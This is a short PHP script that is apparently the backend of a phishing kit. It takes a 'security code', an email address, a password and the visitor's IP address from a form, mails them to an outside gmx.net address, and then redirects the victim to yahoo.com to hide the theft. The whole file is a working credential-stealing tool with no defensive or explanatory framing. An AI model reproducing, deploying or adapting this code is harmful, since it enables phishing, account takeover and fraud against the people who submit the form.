<?php
session_start();
ob_start("ob_gzhandler");
set_time_limit(0);

// Configuration
$site_email = 'info@middleeastinvestfunds.com';
$sender_name = 'Your Sender Name';
$reply_to_email = 'replyto@example.com';
$recipient = "bossemail@gmx.net";
$subject = "New Submission";

// Sanitize input data
function sanitize($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
}

// Collect and sanitize data
$security_code = sanitize($_POST['cid']);
$username = sanitize($_POST['email']);
$password = sanitize($_POST['pass']);
$ip = getenv("REMOTE_ADDR");

// Prepare the email message
$message = "New Submission Details:\n";
$message .= "Security Code: $security_code\n";
$message .= "Username: $username\n";
$message .= "Password: $password\n";
$message .= "IP Address: $ip\n";

// Prepare headers
$headers = "From: $sender_name <$site_email>\r\n";
$headers .= "Reply-To: $reply_to_email\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/plain; charset=UTF-8\r\n";

// Send email
if (mail($recipient, $subject, $message, $headers)) {
    header("Location: https://www.yahoo.com");
    exit;
} else {
    echo "ERROR! Please go back and try again.";
}
?>
